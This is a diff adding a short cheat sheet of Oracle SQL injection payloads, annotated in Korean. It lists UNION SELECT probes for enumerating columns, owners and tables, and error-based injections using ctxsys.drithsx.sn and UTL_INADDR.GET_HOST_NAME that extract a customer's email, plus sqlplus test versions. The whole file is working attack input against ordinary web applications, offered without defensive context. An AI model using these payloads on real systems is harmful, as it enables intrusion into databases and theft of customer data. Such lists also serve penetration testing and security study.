@@ -1,0 +1,12 @@
+' UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9', '10' FROM dual --            기본
+' union select '1','2', '3', '4', '5', '6', '7', '8', '9',column_name FROM all_tab_columns --          모든 컬럼명 조회
+' union select '1','2', '3', '4', '5', '6', '7', '8', '9',owner FROM all_tables --          DB 명 조회
+' union select '1','2', '3', '4', '5', '6', '7', '8', '9',table_name FROM all_tables --    모든 테이블 조회
+' union select '1','2', '3', '4', '5', '6', '7', '8', '9',tname FROM tab -- 현재 DB에 있는 테이블 조회
+' and ctxsys.drithsx.sn(user,(select email from customer where name='12345'))=1 --   에러베이스드 서브쿼리 실행
+' and UTL_INADDR.GET_HOST_NAME((원하는 서브쿼리 내용)) --
+
+
+
+select name,address from customer where name='123' and ctxsys.drithsx.sn(user,(select email from customer where name='12345'))=1       sqlplus에서 테스트
+select name,address from customer where name='123' and UTL_INADDR.GET_HOST_NAME((select email from customer where name='12345'))=1 
